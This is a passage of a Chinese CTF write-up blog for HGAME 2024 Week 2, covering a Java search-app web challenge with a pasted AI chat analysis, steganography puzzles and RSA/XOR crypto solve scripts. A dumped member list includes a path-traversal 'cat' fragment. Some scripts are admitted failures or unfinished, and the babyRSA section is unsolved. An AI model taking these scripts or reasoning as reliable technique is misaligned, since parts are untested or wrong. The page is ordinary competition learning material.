+<li>渗透 / 人工智能 / 北师大博士在读,什么都不会 / 咸鱼研究生 / 安恒、长亭 /  SJTU,13 级菜鸡 / 大数据打杂,13 级 HDUISA 会长 / Web 安全 / 华为安全部门 /  二进制安全，fuzz，符号执行方向研究,Web 安全 / 安全工程师 / 半吊子开发 / 半吊子安全研究,14 级网安协会副会长 /  无线安全,14 级网安协会副会长 / Web 安全 / 无线安全,14 级 / Web 🐶 / 杭电江流儿 / 自走棋主教守门员,13 级 / 知道创宇 404 安全研究员 / 现在 Nu1L 划划水 / IoT、Web、二进制漏洞，密码学，区块链都看得懂一点，但啥也不会,14  级网安协会会长 / HDUISA 成员 / Web 安全 / Freebuf 安全社区特约作者 / FSI2015Freebuf 特邀嘉宾,14 级 HDUISA 副会长 / 二次元 / 拼多多安全工程师,14 级 HDUISA 会长 / 二进制安全 / 曾被  NULL、TD、蓝莲花等拉去凑人数 / 差点没毕业 / 长亭安研,15 级 / Web 🐶 / 汪汪汪,15 级 / 已入 Python  神教,15 级 / 删库跑路熟练工 / 没事儿拍个照 / 企鹅,15 级 / 挖不到洞 / 打不动 CTF / 内网渗透不了 /  工具写不出,15 级 Vidar 会长 / 送分型逆向选手 / 13 段剑纯 / 差点没毕业 / 阿斯巴甜有点甜,15 级 / 什么都不会的开发 / 打什么都菜,Web 安全 / 长亭科技安服部门 / TSRC 2015 年年度英雄榜第八、2016 年年度英雄榜第十三,二进制 CGC  入门水准 / 半吊子爬虫与反爬虫,逆向 / 二进制安全,15 级网安协会会长 / Web 安全,16级 / 前web手、现pwn手 /  菜鸡研究生 / scu,16 级 / Web / 菜鸡第一人,16 级 / 蟒蛇饲养员 / 高数小王子,16级 / 大果子 /  毕业1年仍在寻找vidar娘接盘侠,16 级 / Web 前端 / 水母一小只 / 程序员鼓励师 / Cy 来组饥荒！,16 级 / Web  前端 / 美工 / 阿里云搬砖,16 级 / Java 开发攻城狮 / 996 选手 / 濒临猝死,16 级 / Web 🐱 /  现于长亭科技实习,16 级 / Bin / 被迫研狗,16 级 / Rev / Windows / Freelancer,16 级 /  可能会运维 / 摸鱼选手,16 级 / Web Developer,16 级 / Java 福娃 / 上班 996 / 下班 669,16  级会长 / Web 后端 / 会一点点 Web 安全 / 会一丢丢二进制,16 级 / 立志学术的统计er / R /  为楼上的脱单事业做出了贡献,17级 / web / 东南读研,17级 / 游戏厂打工仔 / 来深圳找我快活,17级/ Key厨 /  腾讯玄武倒水的,17级 / RedTeamer / 字节跳动安全工程师,17级 / 二战人 / 老二次元 / 兴趣驱动生活,17级 /  摸鱼ctfer / 依旧在尝试入门bin / 菜鸡研究生+1,17 级 / 业余开发 / 专业摸鱼,17 级 / Web,17 级 / 自称  Bin 手实际啥都不会 / 二次元安全,17级 / Focus on Java Security,17 级 / Web 安全爱好者 /  半个程序员 / 没有女朋友,18级 / 并不会web / 端茶送水选手,18级 / 不可以摸🐠哦,18级 / 编译器工程师( 伪 /  半吊子PL- 静态分析方向,18 级 / Java / 会除我佬,18级 / 囊地鼠饲养员 / 写了一个叫 Cardinal 的平台,18 级 / 不擅长 Web / 擅长摸鱼 / 摸鱼！,18级 / 懂点Web &amp; Misc / 懂点运维 / 正在懂游戏引擎 / 我们联合！,18 级 / Web / 真·菜到超乎想象 / 拼死学（mo）习（yu）中,18 级 / Web 底层选手,18级 / 游戏引擎开发 /  尚有梦想的game maker,18级会长 / 二进制安全 /  干拉,18级 / 会一丢丢crypto / 摸鱼,18 级 / Web /  车万,18 级 / 求大佬带我IoT入门 / web太难了只能做做misc维持生计 / 摸🐟,18级 / 会点开发的退休web手 / 想学挖洞 / 混吃等死,18 级 / Bin / Win / 电竞缺乏视力 / 开发太菜 / 只会 C / CSGO 白给选手,18级 /  莫得灵魂的开发 / 茄粉 / 作豚 /  米厨,18 级 / 完全不会安全 / 一个做设计的鸽子美工 / 天天画表情包,19级 /  Re手，我手呢？,19级会长 / DL爱好者 / web苦手,19级 / 挖坑不填的web选手,19级 / 半个全栈 / 安卓摸🐟 / P  社玩家 / 🍆粉,19级 / 游戏开发 / 🐟粉,19级 / 普通的binary爱好者。,19级 / 不会re / dl萌新 /  太弱小了，没有力量 / 想学游戏,19级 / bin底层选手,19级 / 骨瘦如柴的胖手,19级 /  </p><p>Web,19级 / 脖子笔直歪脖手,19级 / 摸鱼美工 / 学习图形学、渲染ing,19级 /  不会web / 半吊子运维 / 今天您漏油了吗,<em>级 / 被拐卖来接盘的格子 / 不可以乱涂乱画哦,20级 /  Crypto&amp;BlockChain / Plz V me 50 eth,20级 / Web / 还在努力,20级 / WEB /  菜的抠脚 / 想学GO,20级 / Crypto / 摸鱼学代师,20级 / web / 想学iot,20级 / Re手 / 菜,20级 /  可能是IOT的MISC手 / 可能是美工 / 废物晚期,20级会长 / re / 不会pwn,20级 / 已退休不再参与大多数赛事 /  不好好学习，生活中就会多出许多魔法和奇迹,20级 / 歪脖手 / 想学运维 / 发呆业务爱好者,20级 / 摆烂网管 / DN42爱好者 /  AS200078管理员,21级 / 入门级crypto,21级 / 喜欢肝原神的密码手,21级web /  cat…/…/…/…/f</em>,21级 / 菜鸡pwn手 / 又菜又爱摆,21级 / 日常自闭的Re手,21级 / 非常菜的密码手 /  很懒的摸鱼爱好者，有点呆，想学点别的但是一直开摆,21级 / 不会Re / 不会美工 / 活在梦里 / 喜欢做不会的事情 / ◼◻粉,22级 / 菜鸡misc手 /不会Web / 成分复杂 / 偶尔炼丹,21级 / 菜鸡pwn手,21级 / 初级魔法少女,21级 / Reverse / I want to fly and fly,21级 / 爪哇开发or安全 / 吉吉国王本急 / 想要apple vision,21级 /  不学Java学Golang的Web / 网管练习生,21级 / 前端练习生,22级 / 菜菜密码手 / 有点社恐又想要多多社交,22级 /  Reverse / 努力变强,22级 / Web,22级 / Web / 狂暴摆烂组长,22级 / 会点web / 偶尔涂鸦,21级 / Web / 啥都会一点，啥都不精通 / 依然是一条努力的咸鱼,22级 / 副会长 / 战队队长 / 二进制安全,22级 / 虚假的会长，真实的运营 / 许墨夫人 : 2 : 3</li>
+</ul>
+<p>​</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://3riccc.github.io">https://3riccc.github.io</a>,<a target="_blank" rel="noopener" href="https://mxgcccc4.github.io/,https://github.com/deadwind4,#,https://lightless.me/,#,#,https://lorexxar.cn/,#,#,#,#,#,#,#,http://heartsky.info,https://processor.pub/,#,#,#,#,#,#,https://www.ckj123.com,https://ngc7292.github.io/,https://b0lv42.github.io/,#,https://cyris.moe/,#,https://jianshu.com/u/ad5c1e097b84,https://veritas501.space,https://vvv-347.space,http://0x2f.xyz,https://github.com/Last-Order,#,#,#,https://blog.lou00.top,https://chenxy.me,https://blog.ar1s.top,https://brownfly.github.io,https://migoooo.github.io/,#,https://www.intmian.com,#,http://ch1p.top,#,https://blog.0e1.top,#,http://r4u.top/,#,http://michaelsblog.top/,https://github.red/,https://blog.wz22.cc,https://www.zhouweitong.site,#,http://www.roc826.cn/,https://r000setta.github.io,https://danisjiang.com,#,https://harmless.blue/,http://logong.vip,https://annevi.cn,https://blog.xyzz.ml:444,https://cosmos.red,https://wzyxv1n.top/,https://wr-web.github.io,http://poi.ac,http://aw.gamison.top,https://altonhe.github.io/,https://d1g.club,#,#,https://r3n0.top,https://www.xi4oyu.top/,https://github.com/0x4qE,https://github.com/Liki4,https://fl0.top/,https://4kr.top,https://twitter.com/LAttic1ng,https://lee-tc.github.io/,https://ek1ng.com,https://blog.mjclouds.com,https://chenmofeijin.top,https://homeboyc.cn/,https://0wl-alt.github.io,#,https://4nsw3r.top/,https://cjovi.icu,https://blog.m1dsummer.top,https://potat0.cc/,#,https://clingm.top,https://www.bilibili.com/video/BV1GJ411x7h7/,https://hakuya.work,https://blog.t0hka.top/,https://y01and3.github.io/,https://ba1van4.icu/,https://sd0ric4.github.io/,#,https://www.jian.pl,https://www.cnblogs.com/biyifei,http://www.luelueking.com,https://baimeow.cn,https://im.daidr.me,https://fcrumbling.github.io/,#,https://blog.hiirachan.moe,https://rippleqaq.github.io,http://ma5hr00m.top,https://r1esbyfe.top/,https://l0tus.vip,#">https://mxgcccc4.github.io/,https://github.com/deadwind4,#,https://lightless.me/,#,#,https://lorexxar.cn/,#,#,#,#,#,#,#,http://heartsky.info,https://processor.pub/,#,#,#,#,#,#,https://www.ckj123.com,https://ngc7292.github.io/,https://b0lv42.github.io/,#,https://cyris.moe/,#,https://jianshu.com/u/ad5c1e097b84,https://veritas501.space,https://vvv-347.space,http://0x2f.xyz,https://github.com/Last-Order,#,#,#,https://blog.lou00.top,https://chenxy.me,https://blog.ar1s.top,https://brownfly.github.io,https://migoooo.github.io/,#,https://www.intmian.com,#,http://ch1p.top,#,https://blog.0e1.top,#,http://r4u.top/,#,http://michaelsblog.top/,https://github.red/,https://blog.wz22.cc,https://www.zhouweitong.site,#,http://www.roc826.cn/,https://r000setta.github.io,https://danisjiang.com,#,https://harmless.blue/,http://logong.vip,https://annevi.cn,https://blog.xyzz.ml:444,https://cosmos.red,https://wzyxv1n.top/,https://wr-web.github.io,http://poi.ac,http://aw.gamison.top,https://altonhe.github.io/,https://d1g.club,#,#,https://r3n0.top,https://www.xi4oyu.top/,https://github.com/0x4qE,https://github.com/Liki4,https://fl0.top/,https://4kr.top,https://twitter.com/LAttic1ng,https://lee-tc.github.io/,https://ek1ng.com,https://blog.mjclouds.com,https://chenmofeijin.top,https://homeboyc.cn/,https://0wl-alt.github.io,#,https://4nsw3r.top/,https://cjovi.icu,https://blog.m1dsummer.top,https://potat0.cc/,#,https://clingm.top,https://www.bilibili.com/video/BV1GJ411x7h7/,https://hakuya.work,https://blog.t0hka.top/,https://y01and3.github.io/,https://ba1van4.icu/,https://sd0ric4.github.io/,#,https://www.jian.pl,https://www.cnblogs.com/biyifei,http://www.luelueking.com,https://baimeow.cn,https://im.daidr.me,https://fcrumbling.github.io/,#,https://blog.hiirachan.moe,https://rippleqaq.github.io,http://ma5hr00m.top,https://r1esbyfe.top/,https://l0tus.vip,#</a> : 2 : 3</li>
+<li>？？？？？？？？？</li>
+<li>flag呢？？？？？？？？</li>
+<li>啊？？？？？？？</li>
+<li>这不是SQL题？？？？</li>
+<li>啊？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？</li>
+<li>难道是什么高级RCE？？？</li>
+<li>Vidar-Team have so much members,so 1ue write an api to search…</li>
+<li>API  这个是提示。。</li>
+<li>往这里想想\</li>
+<li>坏了，不会真是什么rce吧？？？</li>
+<li>啊hint1: 环境不出网，需要rce，建议本地先打通</li>
+<li>我哭死</li>
+<li>直接当成sql打了，没想到竟然是rce</li>
+</ul>
+<p>rce的话重新分析一下源代码</p>
+<p>这段代码是一个简易的Java Web应用程序，使用了Solon框架、HikariCP连接池和H2数据库。它由三个主要部分组成：数据库管理配置（<code>DbManager</code>），控制器（<code>SearchController</code>），以及应用入口（<code>App</code>）。下面是对每个部分的详细解析：</p>
+<p>DbManager类</p>
+<ul>
+<li>作用：负责数据库的配置和初始化。</li>
+<li>核心功能：
+<ul>
+<li>使用注解<code>@Component</code>标记为Solon容器的组件。</li>
+<li>通过<code>@Inject</code>注解注入配置文件中的<code>project.home</code>属性。</li>
+<li>在<code>init</code>方法中配置并初始化H2数据库连接。使用<code>HikariConfig</code>设置数据库连接，并通过<code>HikariDataSource</code>创建数据源。</li>
+<li>使用<code>RunScript.execute</code>执行初始化SQL脚本（位于<code>home+&quot;init.sql&quot;</code>）。</li>
+</ul>
+</li>
+</ul>
+<p>SearchController类</p>
+<ul>
+<li>作用：处理Web请求，实现搜索功能。</li>
+<li>核心功能：
+<ul>
+<li>使用<code>@Controller</code>标记为Solon框架的控制器组件。</li>
+<li>通过<code>@Inject</code>注解将<code>DbManager</code>注入控制器，用于获取数据库连接。</li>
+<li><code>search</code>方法通过<code>@Mapping(&quot;/&quot;)</code>注解映射到根URL，接收一个搜索关键字（<code>keyword</code>），执行数据库查询，并返回查询结果。</li>
+<li>构造<code>ModelAndView</code>对象，将查询结果放入模型中，最后返回给视图层（假设为<code>search.ftl</code>Freemarker模板）进行展示。</li>
+</ul>
+</li>
+</ul>
+<p>App类</p>
+<ul>
+<li>作用：应用的启动入口。</li>
+<li>核心功能：
+<ul>
+<li>调用<code>Solon.start</code>方法启动Solon框架，传入<code>App.class</code>和命令行参数<code>args</code>。</li>
+</ul>
+</li>
+</ul>
+<p>2024/2/7 15:02:23</p>
+<p>这个应用是否存在RCE风险</p>
+<p>2024/2/7 15:02:59</p>
+<p>从提供的代码片段中直接分析，没有明显的远程代码执行（RCE）漏洞。然而，存在SQL注入的风险可能会被利用作为攻击链的一环，最终可能导致更严重的安全问题，包括但不限于RCE，尤其是如果数据库配置或者数据库用户权限设置不当。</p>
+<p>分析</p>
+<ul>
+<li><strong>SQL注入</strong>：如前所述，<code>SearchController</code>类中通过字符串拼接构建SQL查询，这种方式容易受到SQL注入攻击。虽然这本身不直接导致RCE，但如果攻击者能够通过SQL注入读取、修改数据库数据，或者利用数据库的某些高级功能（如在某些数据库管理系统中执行系统命令），那么理论上可能会升级为RCE攻击。</li>
+<li><strong>直接RCE途径</strong>：在提供的代码中，并没有直接执行外部命令的操作，也没有动态执行代码的情况（例如，Java的<code>Runtime.exec()</code>方法或<code>eval</code>函数等）。因此，从代码本身看，没有直接的RCE风险点。</li>
+</ul>
+<p>注意事项</p>
+<ul>
+<li><strong>第三方库和框架：虽然代码本身可能没有RCE漏洞，但使用的第三方库（如Solon框架、HikariCP连接池、H2数据库等）可能存在已知或未知的安全漏洞。因此，保持这些依赖库更新至最新安全版本是非常重要的。</strong></li>
+</ul>
+<p>最后这句话引起了我的注意</p>
+<p>我立马去查了这几个框架和api相关的RCE问题</p>
+<p>1ue write an api to search…</p>
+<p>搜索功能的API通过<code>SearchController</code>类中的<code>search</code>方法提供。这个方法映射到根URL(<code>/</code>)上，并期望接收一个查询参数<code>keyword</code>。它构造并执行一个SQL查询，搜索数据库中符合条件的记录，并将搜索结果格式化后返回给用户。返回的数据通过<code>ModelAndView</code>对象传递给视图（在这个例子中是<code>search.ftl</code>Freemarker模板），最终显示给用户。</p>
+<h2 id="MISC">MISC</h2>
+<h6 id="ezword">ezword</h6>
+<p>卡尔达诺栅格码在线</p>
+<p>籱籰籪籶籮粄簹籴籨粂籸籾籨籼簹籵籿籮籨籪籵簺籨籽籱簼籨籼籮籬类簼籽粆</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240205203307444.png" srcset="/img/loading.gif" lazyload alt="image-20240205203307444"></p>
+<h6 id="龙之舞">龙之舞</h6>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240205203759435.png" srcset="/img/loading.gif" lazyload alt="image-20240205203759435"></p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240205203916113.png" srcset="/img/loading.gif" lazyload alt="image-20240205203916113"></p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240205204039145.png" srcset="/img/loading.gif" lazyload alt="image-20240205204039145"></p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240205205118081.png" srcset="/img/loading.gif" lazyload alt="image-20240205205118081"></p>
+<p>binwalk</p>
+<p>不是</p>
+<p>思路错了</p>
+<p>无线电？</p>
+<p>不是</p>
+<p>思路错了</p>
+<p>带key wav隐写一般只有两种</p>
+<p>mp3stego</p>
+<p>试了很久没有</p>
+<p>deepsound有了</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240205223214171.png" srcset="/img/loading.gif" lazyload alt="image-20240205223214171"></p>
+<p>![img](file:///C:/Users/asus/Documents/DeepSound/XXX/龙之舞.gif)</p>
+<p>得到gif</p>
+<p>帧隐写</p>
+<p>stegsolve</p>
+<p>拆开后合成</p>
+<p>QRreserach</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240205224506878.png" srcset="/img/loading.gif" lazyload alt="image-20240205224506878"></p>
+<p>暴力破解</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240205232055843.png" srcset="/img/loading.gif" lazyload alt="image-20240205232055843"></p>
+<p>hgame{drag0n_1s_d4nc1ng}</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240205231735217.png" srcset="/img/loading.gif" lazyload alt="image-20240205231735217"></p>
+<h6 id="ek1ng-want-girlfriend">ek1ng_want_girlfriend</h6>
+<p>![img](file:///G:/aaa.jpg)</p>
+<p>流量包里发现请求了一张图片</p>
+<p>流追踪一下</p>
+<p>hex显示</p>
+<p>追踪jpg文件头尾 FF D8 FF           FF D9</p>
+<p>把图片截取出来</p>
+<h6 id="华容道">华容道</h6>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240207193003694.png" srcset="/img/loading.gif" lazyload alt="image-20240207193003694"></p>
+<h2 id="Crypto">Crypto</h2>
+<h6 id="backpack">backpack</h6>
+<p>这道题p=random.getrandbits(32)</p>
+<p>enc=bytes_to_long(flag)^p</p>
+<p>随机数也不大</p>
+<p>那就爆呗</p>
+<p>p=random.getrandbits(32)，enc=bytes_to_long(flag)^p 给我一个爆破p求解flag的脚本，我已经知道enc了</p>
+<p><code>p</code>是一个32位的随机整数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">python<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bytes_to_long</span>(<span class="hljs-params">bytes_val</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>.from_bytes(bytes_val, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">enc, p</span>):<br>    <span class="hljs-comment"># 异或</span><br>    possible_flag = enc ^ p<br>    <span class="hljs-keyword">return</span> long_to_bytes(possible_flag)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">brute_force</span>(<span class="hljs-params">enc</span>):<br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**<span class="hljs-number">32</span>):<br>        flag = decrypt(enc, p)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">all</span>(<span class="hljs-number">32</span> &lt;= b &lt;= <span class="hljs-number">126</span> <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> flag):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found p: <span class="hljs-subst">&#123;p&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Flag: <span class="hljs-subst">&#123;flag.decode()&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">break</span><br>enc = <span class="hljs-number">871114172567853490297478570113449366988793760172844644007566824913350088148162949968812541218339</span><br>brute_force(enc)<br></code></pre></td></tr></table></figure>
+<p>p: 2105344</p>
+<p>hgame{M@ster_0f ba3kpack_m4nag3ment!}</p>
+<h6 id="midRSA">midRSA</h6>
+<p>这个题出的也有问题</p>
+<p>本来你是给了我e，c，n，和m=m0&gt;&gt;208；</p>
+<p>然后还告诉了我填充方式padding</p>
+<p>但是你这个题出的有问题呀，m0直接逆向一下回去就直接看到了</p>
+<p>这没得做。。</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206014519732.png" srcset="/img/loading.gif" lazyload alt="image-20240206014519732"></p>
+<p>正儿八经小e攻击，广播攻击+部分信息泄露攻击就出来了</p>
+<p>wp如下</p>
+<p>import libnum<br>
+import gmpy2</p>
+<p>n = 120838778421252867808799302603972821425274682456261749029016472234934876266617266346399909705742862458970575637664059189613618956880430078774892479256301209695323302787221508556481196281420676074116272495278097275927604857336484564777404497914572606299810384987412594844071935546690819906920254004045391585427<br>
+c = 118961547254465282603128910126369011072248057317653811110746611348016137361383017921465395766977129601435508590006599755740818071303929227578504412967513468921191689357367045286190040251695094706564443721393216185563727951256414649625597950957960429709583109707961019498084511008637686004730015209939219983527<br>
+e = 3<br>
+m0_prefix = 13292147408567087351580732082961640130543313742210409432471625281702327748963274496942276607</p>
+<p>prefix_str = b’hgame’<br>
+prefix_num = libnum.s2n(prefix_str)</p>
+<p>m_high = m0_prefix &lt;&lt; 208</p>
+<p>for padding_len in range(64 - len(prefix_str)):</p>
+<p>​    m_guess = prefix_num &lt;&lt; (padding_len * 8)<br>
+​    m_guess |= m_high  # 合并已知的高位部分<br>
+​    c_guess = pow(m_guess, e, n)<br>
+​    if c_guess == c:<br>
+​        print(“找到了 m:”, m_guess)<br>
+​        flag = libnum.n2s(m_guess)<br>
+​        print(“Flag:”, flag)<br>
+​        break</p>
+<p>这样应该也能出，但我跑了半天也没跑出来就是了，可能需要一些时间，毕竟m低位208位的尝试也不是个小数目</p>
+<h6 id="midRSA-revenge">midRSA revenge</h6>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206200945245.png" srcset="/img/loading.gif" lazyload alt="image-20240206200945245"></p>
+<p>得到前半截</p>
+<p>小e指数攻击</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">import</span> gmpy2<br><br><span class="hljs-comment"># 已知条件</span><br>c = <span class="hljs-number">456221314115867088638207203034494636244706611111621723577848729096069230067958132663018625661447131501758684502639383208332844681939698124459188571813527149772292464139530736717619741704945926075632064072125361516435631121845753186559297993355270779818057702973783391589851159114029310296551701456748698914231344835187917559305440269560613326893204748127999254902102919605370363889581136724164096879573173870280806620454087466970358998654736755257023225078147018537101</span><br><br><span class="hljs-comment"># 尝试对c进行五次开方</span><br>m_root, exact = gmpy2.iroot(c, <span class="hljs-number">5</span>)<br><br><span class="hljs-keyword">if</span> exact:<br>    <span class="hljs-comment"># 如果开方结果是精确的，则转换为bytes</span><br>    m_bytes = long_to_bytes(<span class="hljs-built_in">int</span>(m_root))<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Flag:&quot;</span>, m_bytes.decode())<br>    <span class="hljs-keyword">except</span> UnicodeDecodeError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解码错误，可能不是有效的文本格式。&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;五次开方结果不精确，可能无法直接恢复完整的m。&quot;</span>)<br><br></code></pre></td></tr></table></figure>
+<h6 id="babyRSA-没做出来">babyRSA[没做出来]</h6>
+<p>先求e 根据模除性质 简化问题得</p>
+<p>9751789326354522940=pow(e+114514,65537,14213355454944773291)</p>
+<p>gift=pow(e+114514+p**k,0x10001,p)</p>
+<p>gift=pow(e+114514,65537,p)</p>
+<p>p是素数</p>
+<p>费马小定理</p>
+<p>如果 (p) 是一个素数，且 (a) 是任何不被 (p) 整除的整数，则下面的等式成立：</p>
+<p>[a^{p-1} \equiv 1 \mod p]</p>
+<p>(gift) ^ (p-1)同余1 mod p=1</p>
+<p>(gift) ^ (p-1) mod p =1</p>
+<p>[(e+114514)^65537]^(p-1) mod p 同余1mod p</p>
+<p>[(e+114514)^65537]^(p-1) mod p =1</p>
+<p>嘶</p>
+<p>好像求不出来</p>
+<p>e=73561，如果flag不以hgame开头，那么e+=14213355454944773291，继续循环，直至得到hgame开头的flag</p>
+<p>这样爆破行不行</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240207165748835.png" srcset="/img/loading.gif" lazyload alt="image-20240207165748835"></p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240207170044712.png" srcset="/img/loading.gif" lazyload alt="image-20240207170044712"></p>
+<p>脚本求出e后  验证一下算的对不对</p>
+<p>验证是对的</p>
+<p>但是我忘了一个问题</p>
+<p>这样的e有无数个</p>
+<p>是e0+moduls * K的集合</p>
+<p>再算p**4</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240207170418297.png" srcset="/img/loading.gif" lazyload alt="image-20240207170418297"></p>
+<p>得知这些后根据一般RSA理论求解即可</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HGAME_WEEK2</div>
+      <div>https://s0k1y.github.io/2024/03/13/HGAME-WEEK2/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>s0k1y</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年3月13日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/03/13/HGAME-WEEK3/" title="HGAME_WEEK3">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HGAME_WEEK3</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/03/13/HGAME-WEEK1/" title="HGAME_WEEK1">
+                        <span class="hidden-mobile">HGAME_WEEK1</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
